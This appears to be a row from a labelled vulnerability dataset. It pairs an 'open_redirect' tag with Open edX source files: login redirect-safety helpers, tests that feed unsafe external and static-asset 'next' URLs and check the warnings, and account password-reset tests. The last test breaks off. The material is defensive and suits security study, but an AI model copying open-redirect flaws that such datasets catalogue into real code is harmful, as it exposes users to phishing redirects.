    return jsonify(error=str(response.content))

""""""
   **Database errands**

""""""

""""""Creates entry for politicians in the db
    *Note* : Do not run it more than once, will create multiple entries
""""""
@app.route('/updatedb/politicians')
def update_all():
  return insert_politicians_in_db()
/n/n/n",1,open_redirect
22,40,84c6c5ac27627db8aa829ead02ec98e8afa94b1e,"common/djangoapps/student/helpers.py/n/n""""""Helpers for the student app. """"""
import logging
import mimetypes
import urllib
import urlparse
from datetime import datetime

from django.conf import settings
from django.core.urlresolvers import NoReverseMatch, reverse
from django.utils import http
from oauth2_provider.models import AccessToken as dot_access_token
from oauth2_provider.models import RefreshToken as dot_refresh_token
from provider.oauth2.models import AccessToken as dop_access_token
from provider.oauth2.models import RefreshToken as dop_refresh_token
from pytz import UTC

import third_party_auth
from course_modes.models import CourseMode
from lms.djangoapps.verify_student.models import SoftwareSecurePhotoVerification, VerificationDeadline
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from openedx.core.djangoapps.theming.helpers import get_themes

# Enumeration of per-course verification statuses
# we display on the student dashboard.
VERIFY_STATUS_NEED_TO_VERIFY = ""verify_need_to_verify""
VERIFY_STATUS_SUBMITTED = ""verify_submitted""
VERIFY_STATUS_RESUBMITTED = ""re_verify_submitted""
VERIFY_STATUS_APPROVED = ""verify_approved""
VERIFY_STATUS_MISSED_DEADLINE = ""verify_missed_deadline""
VERIFY_STATUS_NEED_TO_REVERIFY = ""verify_need_to_reverify""

DISABLE_UNENROLL_CERT_STATES = [
    'generating',
    'ready',
]


log = logging.getLogger(__name__)


def check_verify_status_by_course(user, course_enrollments):
    """"""
    Determine the per-course verification statuses for a given user.

    The possible statuses are:
        * VERIFY_STATUS_NEED_TO_VERIFY: The student has not yet submitted photos for verification.
        * VERIFY_STATUS_SUBMITTED: The student has submitted photos for verification,
          but has have not yet been approved.
        * VERIFY_STATUS_RESUBMITTED: The student has re-submitted photos for re-verification while
          they still have an active but expiring ID verification
        * VERIFY_STATUS_APPROVED: The student has been successfully verified.
        * VERIFY_STATUS_MISSED_DEADLINE: The student did not submit photos within the course's deadline.
        * VERIFY_STATUS_NEED_TO_REVERIFY: The student has an active verification, but it is
            set to expire before the verification deadline for the course.

    It is is also possible that a course does NOT have a verification status if:
        * The user is not enrolled in a verified mode, meaning that the user didn't pay.
        * The course does not offer a verified mode.
        * The user submitted photos but an error occurred while verifying them.
        * The user submitted photos but the verification was denied.

    In the last two cases, we rely on messages in the sidebar rather than displaying
    messages for each course.

    Arguments:
        user (User): The currently logged-in user.
        course_enrollments (list[CourseEnrollment]): The courses the user is enrolled in.

    Returns:
        dict: Mapping of course keys verification status dictionaries.
            If no verification status is applicable to a course, it will not
            be included in the dictionary.
            The dictionaries have these keys:
                * status (str): One of the enumerated status codes.
                * days_until_deadline (int): Number of days until the verification deadline.
                * verification_good_until (str): Date string for the verification expiration date.

    """"""
    status_by_course = {}

    # Retrieve all verifications for the user, sorted in descending
    # order by submission datetime
    verifications = SoftwareSecurePhotoVerification.objects.filter(user=user)

    # Check whether the user has an active or pending verification attempt
    # To avoid another database hit, we re-use the queryset we have already retrieved.
    has_active_or_pending = SoftwareSecurePhotoVerification.user_has_valid_or_pending(
        user, queryset=verifications
    )

    # Retrieve expiration_datetime of most recent approved verification
    # To avoid another database hit, we re-use the queryset we have already retrieved.
    expiration_datetime = SoftwareSecurePhotoVerification.get_expiration_datetime(user, verifications)
    verification_expiring_soon = SoftwareSecurePhotoVerification.is_verification_expiring_soon(expiration_datetime)

    # Retrieve verification deadlines for the enrolled courses
    enrolled_course_keys = [enrollment.course_id for enrollment in course_enrollments]
    course_deadlines = VerificationDeadline.deadlines_for_courses(enrolled_course_keys)

    recent_verification_datetime = None

    for enrollment in course_enrollments:

        # If the user hasn't enrolled as verified, then the course
        # won't display state related to its verification status.
        if enrollment.mode in CourseMode.VERIFIED_MODES:

            # Retrieve the verification deadline associated with the course.
            # This could be None if the course doesn't have a deadline.
            deadline = course_deadlines.get(enrollment.course_id)

            relevant_verification = SoftwareSecurePhotoVerification.verification_for_datetime(deadline, verifications)

            # Picking the max verification datetime on each iteration only with approved status
            if relevant_verification is not None and relevant_verification.status == ""approved"":
                recent_verification_datetime = max(
                    recent_verification_datetime if recent_verification_datetime is not None
                    else relevant_verification.expiration_datetime,
                    relevant_verification.expiration_datetime
                )

            # By default, don't show any status related to verification
            status = None

            # Check whether the user was approved or is awaiting approval
            if relevant_verification is not None:
                if relevant_verification.status == ""approved"":
                    if verification_expiring_soon:
                        status = VERIFY_STATUS_NEED_TO_REVERIFY
                    else:
                        status = VERIFY_STATUS_APPROVED
                elif relevant_verification.status == ""submitted"":
                    if verification_expiring_soon:
                        status = VERIFY_STATUS_RESUBMITTED
                    else:
                        status = VERIFY_STATUS_SUBMITTED

            # If the user didn't submit at all, then tell them they need to verify
            # If the deadline has already passed, then tell them they missed it.
            # If they submitted but something went wrong (error or denied),
            # then don't show any messaging next to the course, since we already
            # show messages related to this on the left sidebar.
            submitted = (
                relevant_verification is not None and
                relevant_verification.status not in [""created"", ""ready""]
            )
            if status is None and not submitted:
                if deadline is None or deadline > datetime.now(UTC):
                    if SoftwareSecurePhotoVerification.user_is_verified(user):
                        if verification_expiring_soon:
                            # The user has an active verification, but the verification
                            # is set to expire within ""EXPIRING_SOON_WINDOW"" days (default is 4 weeks).
                            # Tell the student to reverify.
                            status = VERIFY_STATUS_NEED_TO_REVERIFY
                    else:
                        status = VERIFY_STATUS_NEED_TO_VERIFY
                else:
                    # If a user currently has an active or pending verification,
                    # then they may have submitted an additional attempt after
                    # the verification deadline passed.  This can occur,
                    # for example, when the support team asks a student
                    # to reverify after the deadline so they can receive
                    # a verified certificate.
                    # In this case, we still want to show them as ""verified""
                    # on the dashboard.
                    if has_active_or_pending:
                        status = VERIFY_STATUS_APPROVED

                    # Otherwise, the student missed the deadline, so show
                    # them as ""honor"" (the kind of certificate they will receive).
                    else:
                        status = VERIFY_STATUS_MISSED_DEADLINE

            # Set the status for the course only if we're displaying some kind of message
            # Otherwise, leave the course out of the dictionary.
            if status is not None:
                days_until_deadline = None

                now = datetime.now(UTC)
                if deadline is not None and deadline > now:
                    days_until_deadline = (deadline - now).days

                status_by_course[enrollment.course_id] = {
                    'status': status,
                    'days_until_deadline': days_until_deadline
                }

    if recent_verification_datetime:
        for key, value in status_by_course.iteritems():  # pylint: disable=unused-variable
            status_by_course[key]['verification_good_until'] = recent_verification_datetime.strftime(""%m/%d/%Y"")

    return status_by_course


def auth_pipeline_urls(auth_entry, redirect_url=None):
    """"""Retrieve URLs for each enabled third-party auth provider.

    These URLs are used on the ""sign up"" and ""sign in"" buttons
    on the login/registration forms to allow users to begin
    authentication with a third-party provider.

    Optionally, we can redirect the user to an arbitrary
    url after auth completes successfully.  We use this
    to redirect the user to a page that required login,
    or to send users to the payment flow when enrolling
    in a course.

    Args:
        auth_entry (string): Either `pipeline.AUTH_ENTRY_LOGIN` or `pipeline.AUTH_ENTRY_REGISTER`

    Keyword Args:
        redirect_url (unicode): If provided, send users to this URL
            after they successfully authenticate.

    Returns:
        dict mapping provider IDs to URLs

    """"""
    if not third_party_auth.is_enabled():
        return {}

    return {
        provider.provider_id: third_party_auth.pipeline.get_login_url(
            provider.provider_id, auth_entry, redirect_url=redirect_url
        ) for provider in third_party_auth.provider.Registry.displayed_for_login()
    }


# Query string parameters that can be passed to the ""finish_auth"" view to manage
# things like auto-enrollment.
POST_AUTH_PARAMS = ('course_id', 'enrollment_action', 'course_mode', 'email_opt_in', 'purchase_workflow')


def get_next_url_for_login_page(request):
    """"""
    Determine the URL to redirect to following login/registration/third_party_auth

    The user is currently on a login or registration page.
    If 'course_id' is set, or other POST_AUTH_PARAMS, we will need to send the user to the
    /account/finish_auth/ view following login, which will take care of auto-enrollment in
    the specified course.

    Otherwise, we go to the ?next= query param or to the dashboard if nothing else is
    specified.

    If THIRD_PARTY_AUTH_HINT is set, then `tpa_hint=<hint>` is added as a query parameter.
    """"""
    redirect_to = get_redirect_to(request)
    if not redirect_to:
        try:
            redirect_to = reverse('dashboard')
        except NoReverseMatch:
            redirect_to = reverse('home')

    if any(param in request.GET for param in POST_AUTH_PARAMS):
        # Before we redirect to next/dashboard, we need to handle auto-enrollment:
        params = [(param, request.GET[param]) for param in POST_AUTH_PARAMS if param in request.GET]
        params.append(('next', redirect_to))  # After auto-enrollment, user will be sent to payment page or to this URL
        redirect_to = '{}?{}'.format(reverse('finish_auth'), urllib.urlencode(params))
        # Note: if we are resuming a third party auth pipeline, then the next URL will already
        # be saved in the session as part of the pipeline state. That URL will take priority
        # over this one.

    # Append a tpa_hint query parameter, if one is configured
    tpa_hint = configuration_helpers.get_value(
        ""THIRD_PARTY_AUTH_HINT"",
        settings.FEATURES.get(""THIRD_PARTY_AUTH_HINT"", '')
    )
    if tpa_hint:
        # Don't add tpa_hint if we're already in the TPA pipeline (prevent infinite loop),
        # and don't overwrite any existing tpa_hint params (allow tpa_hint override).
        running_pipeline = third_party_auth.pipeline.get(request)
        (scheme, netloc, path, query, fragment) = list(urlparse.urlsplit(redirect_to))
        if not running_pipeline and 'tpa_hint' not in query:
            params = urlparse.parse_qs(query)
            params['tpa_hint'] = [tpa_hint]
            query = urllib.urlencode(params, doseq=True)
            redirect_to = urlparse.urlunsplit((scheme, netloc, path, query, fragment))

    return redirect_to


def get_redirect_to(request):
    """"""
    Determine the redirect url and return if safe
    :argument
        request: request object

    :returns: redirect url if safe else None
    """"""
    redirect_to = request.GET.get('next')
    header_accept = request.META.get('HTTP_ACCEPT', '')

    # If we get a redirect parameter, make sure it's safe i.e. not redirecting outside our domain.
    # Also make sure that it is not redirecting to a static asset and redirected page is web page
    # not a static file. As allowing assets to be pointed to by ""next"" allows 3rd party sites to
    # get information about a user on edx.org. In any such case drop the parameter.
    if redirect_to:
        mime_type, _ = mimetypes.guess_type(redirect_to, strict=False)
        if not http.is_safe_url(redirect_to):
            log.warning(
                u'Unsafe redirect parameter detected after login page: %(redirect_to)r',
                {""redirect_to"": redirect_to}
            )
            redirect_to = None
        elif 'text/html' not in header_accept:
            log.warning(
                u'Redirect to non html content %(content_type)r detected from %(user_agent)r'
                u' after login page: %(redirect_to)r',
                {
                    ""redirect_to"": redirect_to, ""content_type"": header_accept,
                    ""user_agent"": request.META.get('HTTP_USER_AGENT', '')
                }
            )
            redirect_to = None
        elif mime_type:
            log.warning(
                u'Redirect to url path with specified filed type %(mime_type)r not allowed: %(redirect_to)r',
                {""redirect_to"": redirect_to, ""mime_type"": mime_type}
            )
            redirect_to = None
        elif settings.STATIC_URL in redirect_to:
            log.warning(
                u'Redirect to static content detected after login page: %(redirect_to)r',
                {""redirect_to"": redirect_to}
            )
            redirect_to = None
        else:
            themes = get_themes()
            for theme in themes:
                if theme.theme_dir_name in redirect_to:
                    log.warning(
                        u'Redirect to theme content detected after login page: %(redirect_to)r',
                        {""redirect_to"": redirect_to}
                    )
                    redirect_to = None
                    break

    return redirect_to


def destroy_oauth_tokens(user):
    """"""
    Destroys ALL OAuth access and refresh tokens for the given user.
    """"""
    dop_access_token.objects.filter(user=user.id).delete()
    dop_refresh_token.objects.filter(user=user.id).delete()
    dot_access_token.objects.filter(user=user.id).delete()
    dot_refresh_token.objects.filter(user=user.id).delete()
/n/n/ncommon/djangoapps/student/tests/test_helpers.py/n/n"""""" Test Student helpers """"""

import logging

import ddt
from django.conf import settings
from django.contrib.sessions.middleware import SessionMiddleware
from django.core.urlresolvers import reverse
from django.test import TestCase
from django.test.client import RequestFactory
from django.test.utils import override_settings
from mock import patch
from testfixtures import LogCapture

from student.helpers import get_next_url_for_login_page
from openedx.core.djangoapps.site_configuration.tests.test_util import with_site_configuration_context

LOGGER_NAME = ""student.helpers""


@ddt.ddt
class TestLoginHelper(TestCase):
    """"""Test login helper methods.""""""
    static_url = settings.STATIC_URL

    def setUp(self):
        super(TestLoginHelper, self).setUp()
        self.request = RequestFactory()

    @staticmethod
    def _add_session(request):
        """"""Annotate the request object with a session""""""
        middleware = SessionMiddleware()
        middleware.process_request(request)
        request.session.save()

    @ddt.data(
        (""https://www.amazon.com"", ""text/html"", None,
         ""Unsafe redirect parameter detected after login page: u'https://www.amazon.com'""),
        (""favicon.ico"", ""image/*"", ""test/agent"",
         ""Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'favicon.ico'""),
        (""https://www.test.com/test.jpg"", ""image/*"", None,
         ""Unsafe redirect parameter detected after login page: u'https://www.test.com/test.jpg'""),
        (static_url + ""dummy.png"", ""image/*"", ""test/agent"",
         ""Redirect to non html content 'image/*' detected from 'test/agent' after login page: u'"" + static_url +
         ""dummy.png"" + ""'""),
        (""test.png"", ""text/html"", None,
         ""Redirect to url path with specified filed type 'image/png' not allowed: u'test.png'""),
        (static_url + ""dummy.png"", ""text/html"", None,
         ""Redirect to url path with specified filed type 'image/png' not allowed: u'"" + static_url + ""dummy.png"" + ""'""),
    )
    @ddt.unpack
    def test_unsafe_next(self, unsafe_url, http_accept, user_agent, expected_log):
        """""" Test unsafe next parameter """"""
        with LogCapture(LOGGER_NAME, level=logging.WARNING) as logger:
            req = self.request.get(reverse(""login"") + ""?next={url}"".format(url=unsafe_url))
            req.META[""HTTP_ACCEPT""] = http_accept  # pylint: disable=no-member
            req.META[""HTTP_USER_AGENT""] = user_agent  # pylint: disable=no-member
            get_next_url_for_login_page(req)
            logger.check(
                (LOGGER_NAME, ""WARNING"", expected_log)
            )

    def test_safe_next(self):
        """""" Test safe next parameter """"""
        req = self.request.get(reverse(""login"") + ""?next={url}"".format(url=""/dashboard""))
        req.META[""HTTP_ACCEPT""] = ""text/html""  # pylint: disable=no-member
        next_page = get_next_url_for_login_page(req)
        self.assertEqual(next_page, u'/dashboard')

    @patch('student.helpers.third_party_auth.pipeline.get')
    @ddt.data(
        # Test requests outside the TPA pipeline - tpa_hint should be added.
        (None, '/dashboard', '/dashboard', False),
        ('', '/dashboard', '/dashboard', False),
        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),
        ('saml-idp', '/dashboard', '/dashboard?tpa_hint=saml-idp', False),
        # THIRD_PARTY_AUTH_HINT can be overridden via the query string
        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', False),

        # Test requests inside the TPA pipeline - tpa_hint should not be added, preventing infinite loop.
        (None, '/dashboard', '/dashboard', True),
        ('', '/dashboard', '/dashboard', True),
        ('', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),
        ('saml-idp', '/dashboard', '/dashboard', True),
        # OK to leave tpa_hint overrides in place.
        ('saml-idp', '/dashboard?tpa_hint=oa2-google-oauth2', '/dashboard?tpa_hint=oa2-google-oauth2', True),
    )
    @ddt.unpack
    def test_third_party_auth_hint(self, tpa_hint, next_url, expected_url, running_pipeline, mock_running_pipeline):
        mock_running_pipeline.return_value = running_pipeline

        def validate_login():
            req = self.request.get(reverse(""login"") + ""?next={url}"".format(url=next_url))
            req.META[""HTTP_ACCEPT""] = ""text/html""  # pylint: disable=no-member
            self._add_session(req)
            next_page = get_next_url_for_login_page(req)
            self.assertEqual(next_page, expected_url)

        with override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT=tpa_hint)):
            validate_login()

        with with_site_configuration_context(configuration=dict(THIRD_PARTY_AUTH_HINT=tpa_hint)):
            validate_login()
/n/n/nlms/djangoapps/student_account/test/test_views.py/n/n# -*- coding: utf-8 -*-
"""""" Tests for student account views. """"""

import logging
import re
from unittest import skipUnless
from urllib import urlencode

import ddt
import mock
from django.conf import settings
from django.contrib import messages
from django.contrib.auth import get_user_model
from django.contrib.messages.middleware import MessageMiddleware
from django.core import mail
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.urlresolvers import reverse
from django.http import HttpRequest
from django.test import TestCase
from django.test.utils import override_settings
from edx_oauth2_provider.tests.factories import AccessTokenFactory, ClientFactory, RefreshTokenFactory
from edx_rest_api_client import exceptions
from nose.plugins.attrib import attr
from oauth2_provider.models import AccessToken as dot_access_token
from oauth2_provider.models import RefreshToken as dot_refresh_token
from provider.oauth2.models import AccessToken as dop_access_token
from provider.oauth2.models import RefreshToken as dop_refresh_token
from testfixtures import LogCapture

from commerce.models import CommerceConfiguration
from commerce.tests import factories
from commerce.tests.mocks import mock_get_orders
from course_modes.models import CourseMode
from http.cookies import SimpleCookie
from openedx.core.djangoapps.oauth_dispatch.tests import factories as dot_factories
from openedx.core.djangoapps.programs.tests.mixins import ProgramsApiConfigMixin
from openedx.core.djangoapps.site_configuration.tests.mixins import SiteMixin
from openedx.core.djangoapps.theming.tests.test_util import with_comprehensive_theme_context
from openedx.core.djangoapps.user_api.accounts.api import activate_account, create_account
from openedx.core.djangolib.js_utils import dump_js_escaped_json
from openedx.core.djangolib.testing.utils import CacheIsolationTestCase
from student.tests.factories import UserFactory
from student_account.views import account_settings_context, get_user_orders
from third_party_auth.tests.testutil import ThirdPartyAuthTestMixin, simulate_running_pipeline
from util.testing import UrlResetMixin
from xmodule.modulestore.tests.django_utils import ModuleStoreTestCase

LOGGER_NAME = 'audit'
User = get_user_model()  # pylint:disable=invalid-name


@ddt.ddt
class StudentAccountUpdateTest(CacheIsolationTestCase, UrlResetMixin):
    """""" Tests for the student account views that update the user's account information. """"""

    USERNAME = u""heisenberg""
    ALTERNATE_USERNAME = u""walt""
    OLD_PASSWORD = u""ḅḷüëṡḳÿ""
    NEW_PASSWORD = u""🄱🄸🄶🄱🄻🅄🄴""
    OLD_EMAIL = u""walter@graymattertech.com""
    NEW_EMAIL = u""walt@savewalterwhite.com""

    INVALID_ATTEMPTS = 100
    INVALID_KEY = u""123abc""

    URLCONF_MODULES = ['student_accounts.urls']

    ENABLED_CACHES = ['default']

    def setUp(self):
        super(StudentAccountUpdateTest, self).setUp()

        # Create/activate a new account
        activation_key = create_account(self.USERNAME, self.OLD_PASSWORD, self.OLD_EMAIL)
        activate_account(activation_key)

        # Login
        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)
        self.assertTrue(result)

    @skipUnless(settings.ROOT_URLCONF == 'lms.urls', 'Test only valid in LMS')
    def test_password_change(self):
        # Request a password change while logged in, simulating
        # use of the password reset link from the account page
        response = self._change_password()
        self.assertEqual(response.status_code, 200)

        # Check that an email was sent
        self.assertEqual(len(mail.outbox), 1)

        # Retrieve the activation link from the email body
        email_body = mail.outbox[0].body
        result = re.search(r'(?P<url>https?://[^\s]+)', email_body)
        self.assertIsNot(result, None)
        activation_link = result.group('url')

        # Visit the activation link
        response = self.client.get(activation_link)
        self.assertEqual(response.status_code, 200)

        # Submit a new password and follow the redirect to the success page
        response = self.client.post(
            activation_link,
            # These keys are from the form on the current password reset confirmation page.
            {'new_password1': self.NEW_PASSWORD, 'new_password2': self.NEW_PASSWORD},
            follow=True
        )
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, ""Your password has been reset."")

        # Log the user out to clear session data
        self.client.logout()

        # Verify that the new password can be used to log in
        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)
        self.assertTrue(result)

        # Try reusing the activation link to change the password again
        # Visit the activation link again.
        response = self.client.get(activation_link)
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, ""This password reset link is invalid. It may have been used already."")

        self.client.logout()

        # Verify that the old password cannot be used to log in
        result = self.client.login(username=self.USERNAME, password=self.OLD_PASSWORD)
        self.assertFalse(result)

        # Verify that the new password continues to be valid
        result = self.client.login(username=self.USERNAME, password=self.NEW_PASSWORD)
        self.assertTrue(result)

    @ddt.data(True, False)
    def test_password_change_logged_out(self, send_email):
        # Log the user out
        self.client.logout()

        # Request a password change while logged out, simulating
        # use of the password reset link from the login page
        if send_email:
            response = self._change_password(email=self.OLD_EMAIL)
            self.assertEqual(response.status_code, 200)
        else:
            # Don't send an email in the POST data, simulating
            # its (potentially accidental) omission in the POST
            # data sent from the login page
            response = self._change_password()
            self.assertEqual(response.status_code, 400)

    def test_access_token_invalidation_logged_out(self):
        self.client.logout()
        user = User.objects.get(email=self.OLD_EMAIL)
        self._create_dop_tokens(user)
        self._create_dot_tokens(user)
        response = self._change_password(email=self.OLD_EMAIL)
        self.assertEqual(response.status_code, 200)
        self.assert_access_token_destroyed(user)

    def test_access_token_invalidation_logged_in(self):
        user = User.objects.get(email=self.OLD_EMAIL)
        self._create_dop_tokens(user)
        self._create_dot_tokens(user)
        response = self._change_password()
        self.assertEqual(response.status_code, 200)
        self.assert_access_token_destroyed(user)

    def test_password_change_inactive_user(self):
        # Log out the user created during test setup
        self.client.logout()

        # Create a second user, but do not activate it
        create_account(self.ALTERNATE_USERNAME, self.OLD_PASSWORD, self.NEW_EMAIL)

        # Send the view the email address tied to the inactive user
        response = self._change_password(email=self.NEW_EMAIL)

        # Expect that the activation email is still sent,
        # since the user may have lost the original activation email.
        self.assertEqual(response.status_code, 200)
        self.assertEqual(len(mail.outbox), 1)

    def test_password_change_no_user(self):
        # Log out the user created during test setup
        self.client.logout()

        with LogCapture(LOGGER_NAME, level=logging.INFO) as logger:
            # Send the view an email address not tied to any user
            response = self._change_password(email=self.NEW_EMAIL)
            self.assertEqual(response.status_code, 200)
            logger.check((LOGGER_NAME, 'INFO', 'Invalid password reset attempt'))

    def test_password_change_rate_limited(self):
        # Log out the user created during test setup, to prevent the view from
        # selecting the logged-in user's email address over the email provided
        # in the POST data
        self.client.logout()

        # Make many consecutive bad requests in an attempt to trigger the rate limiter
        for __ in xrange(self.INVALID_ATTEMPTS):
            self._change_password(email=self.NEW_EMAIL)

        response = self._change_password(email=self.NEW_EMAIL)
        self.assertEqual(response.status_code, 403)

    @ddt.data(
        ('post', 'password_change_request', []),
    )
    @ddt.unpack
    def test_require_http_method(self, correct_method, url_name, args):
        wrong_methods = {'get', 'put', 'post', 'head', 'options', 'delete'} - {correct_method}
        url = reverse(url_name, args=args)

        for method in wrong_methods:
            response = getattr(self.client, method)(url)
            self.assertEqual(response.status_code, 405)

    def _change_password(self, email=None):
        """"""Request to change the user's password. """"""
        data = {}

        if email:
            data['email'] = email

        return self.client.post(path=reverse('password_change_request'), data=data)

    def _create_dop_tokens(self, user=None):
        """"""Create dop access token for given user if user provided else for default user.""""""
        if not user:
            user = User.objects.get(email=self.OLD_EMAIL)

        client = ClientFactory()
        access_token = AccessTokenFactory(user=user, client=client)
        RefreshTokenFactory(user=user, client=client, access_token=access_token)

    def _create_dot_tokens(self, user=None):
        """"""Create dop access token for given user if user provided else for default user.""""""
        if not user:
            user = User.objects.get(email=self.OLD_EMAIL)

        application = dot_factories.ApplicationFactory(user=user)
        access_token = dot_factories.AccessTokenFactory(user=user, application=application)
        dot_factories.RefreshTokenFactory(user=user, application=application, access_token=access_token)

    def assert_access_token_destroyed(self, user):
        """"""Assert all access tokens are destroyed.""""""
        self.assertFalse(dot_access_token.objects.filter(user=user).exists())
        self.assertFalse(dot_refresh_token.objects.filter(user=user).exists())
        self.assertFalse(dop_access_token.objects.filter(user=user).exists())
        self.assertFalse(dop_refresh_token.objects.filter(user=user).exists())


@attr(shard=3)
@ddt.ddt
class StudentAccountLoginAndRegistrationTest(ThirdPartyAuthTestMixin, UrlResetMixin, ModuleStoreTestCase):
    """""" Tests for the student account views that update the user's account information. """"""

    USERNAME = ""bob""
    EMAIL = ""bob@example.com""
    PASSWORD = ""password""

    URLCONF_MODULES = ['openedx.core.djangoapps.embargo']

    @mock.patch.dict(settings.FEATURES, {'EMBARGO': True})
    def setUp(self):
        super(StudentAccountLoginAndRegistrationTest, self).setUp()

        # Several third party auth providers are created for these tests:
        self.google_provider = self.configure_google_provider(enabled=True, visible=True)
        self.configure_facebook_provider(enabled=True, visible=True)
        self.configure_dummy_provider(
            visible=True,
            enabled=True,
            icon_class='',
            icon_image=SimpleUploadedFile('icon.svg', '<svg><rect width=""50"" height=""100""/></svg>'),
        )
        self.hidden_enabled_provider = self.configure_linkedin_provider(
            visible=False,
            enabled=True,
        )
        self.hidden_disabled_provider = self.configure_azure_ad_provider()

    @ddt.data(
        (""signin_user"", ""login""),
        (""register_user"", ""register""),
    )
    @ddt.unpack
    def test_login_and_registration_form(self, url_name, initial_mode):
        response = self.client.get(reverse(url_name))
        expected_data = '""initial_mode"": ""{mode}""'.format(mode=initial_mode)
        self.assertContains(response, expected_data)

    @ddt.data(""signin_user"", ""register_user"")
    def test_login_and_registration_form_already_authenticated(self, url_name):
        # Create/activate a new account and log in
        activation_key = create_account(self.USERNAME, self.PASSWORD, self.EMAIL)
        activate_account(activation_key)
        result = self.client.login(username=self.USERNAME, password=self.PASSWORD)
        self.assertTrue(result)

        # Verify that we're redirected to the dashboard
        response = self.client.get(reverse(url_name))
        self.assertRedirects(response, reverse(""dashboard""))

    @ddt.data(
        (None, ""signin_user""),
        (None, ""register_user""),
        (""edx.org"", ""signin_user""),
        (""edx.org"", ""register_user""),
    )
    @ddt.unpack
    def test_login_and_registration_form_signin_not_preserves_params(self, theme, url_name):
        params = [
            ('course_id', 'edX/DemoX/Demo_Course'),
            ('enrollment_action', 'enroll'),
        ]

        # The response should not have a ""Sign In"" button with the URL
        # that preserves the querystring params
        with with_comprehensive_theme_context(theme):
            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        expected_url = '/login?{}'.format(self._finish_auth_url_param(params + [('next', '/dashboard')]))
        self.assertNotContains(response, expected_url)

        # Add additional parameters:
        params = [
            ('course_id', 'edX/DemoX/Demo_Course'),
            ('enrollment_action', 'enroll'),
            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),
            ('email_opt_in', 'true'),
            ('next', '/custom/final/destination')
        ]

        # Verify that this parameter is also preserved
        with with_comprehensive_theme_context(theme):
            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        expected_url = '/login?{}'.format(self._finish_auth_url_param(params))
        self.assertNotContains(response, expected_url)

    @mock.patch.dict(settings.FEATURES, {""ENABLE_THIRD_PARTY_AUTH"": False})
    @ddt.data(""signin_user"", ""register_user"")
    def test_third_party_auth_disabled(self, url_name):
        response = self.client.get(reverse(url_name))
        self._assert_third_party_auth_data(response, None, None, [], None)

    @mock.patch('student_account.views.enterprise_customer_for_request')
    @ddt.data(
        (""signin_user"", None, None, None),
        (""register_user"", None, None, None),
        (""signin_user"", ""google-oauth2"", ""Google"", None),
        (""register_user"", ""google-oauth2"", ""Google"", None),
        (""signin_user"", ""facebook"", ""Facebook"", None),
        (""register_user"", ""facebook"", ""Facebook"", None),
        (""signin_user"", ""dummy"", ""Dummy"", None),
        (""register_user"", ""dummy"", ""Dummy"", None),
        (
            ""signin_user"",
            ""google-oauth2"",
            ""Google"",
            {
                'name': 'FakeName',
                'logo': 'https://host.com/logo.jpg',
                'welcome_msg': 'No message'
            }
        )
    )
    @ddt.unpack
    def test_third_party_auth(
            self,
            url_name,
            current_backend,
            current_provider,
            expected_enterprise_customer_mock_attrs,
            enterprise_customer_mock
    ):
        params = [
            ('course_id', 'course-v1:Org+Course+Run'),
            ('enrollment_action', 'enroll'),
            ('course_mode', CourseMode.DEFAULT_MODE_SLUG),
            ('email_opt_in', 'true'),
            ('next', '/custom/final/destination'),
        ]

        if expected_enterprise_customer_mock_attrs:
            expected_ec = mock.MagicMock(
                branding_configuration=mock.MagicMock(
                    logo=mock.MagicMock(
                        url=expected_enterprise_customer_mock_attrs['logo']
                    ),
                    welcome_message=expected_enterprise_customer_mock_attrs['welcome_msg']
                )
            )
            expected_ec.name = expected_enterprise_customer_mock_attrs['name']
        else:
            expected_ec = None

        enterprise_customer_mock.return_value = expected_ec

        # Simulate a running pipeline
        if current_backend is not None:
            pipeline_target = ""student_account.views.third_party_auth.pipeline""
            with simulate_running_pipeline(pipeline_target, current_backend):
                response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        # Do NOT simulate a running pipeline
        else:
            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        # This relies on the THIRD_PARTY_AUTH configuration in the test settings
        expected_providers = [
            {
                ""id"": ""oa2-dummy"",
                ""name"": ""Dummy"",
                ""iconClass"": None,
                ""iconImage"": settings.MEDIA_URL + ""icon.svg"",
                ""loginUrl"": self._third_party_login_url(""dummy"", ""login"", params),
                ""registerUrl"": self._third_party_login_url(""dummy"", ""register"", params)
            },
            {
                ""id"": ""oa2-facebook"",
                ""name"": ""Facebook"",
                ""iconClass"": ""fa-facebook"",
                ""iconImage"": None,
                ""loginUrl"": self._third_party_login_url(""facebook"", ""login"", params),
                ""registerUrl"": self._third_party_login_url(""facebook"", ""register"", params)
            },
            {
                ""id"": ""oa2-google-oauth2"",
                ""name"": ""Google"",
                ""iconClass"": ""fa-google-plus"",
                ""iconImage"": None,
                ""loginUrl"": self._third_party_login_url(""google-oauth2"", ""login"", params),
                ""registerUrl"": self._third_party_login_url(""google-oauth2"", ""register"", params)
            },
        ]
        self._assert_third_party_auth_data(
            response,
            current_backend,
            current_provider,
            expected_providers,
            expected_ec
        )

    def test_hinted_login(self):
        params = [(""next"", ""/courses/something/?tpa_hint=oa2-google-oauth2"")]
        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""oa2-google-oauth2""')

        tpa_hint = self.hidden_enabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""{0}""'.format(tpa_hint))

        tpa_hint = self.hidden_disabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
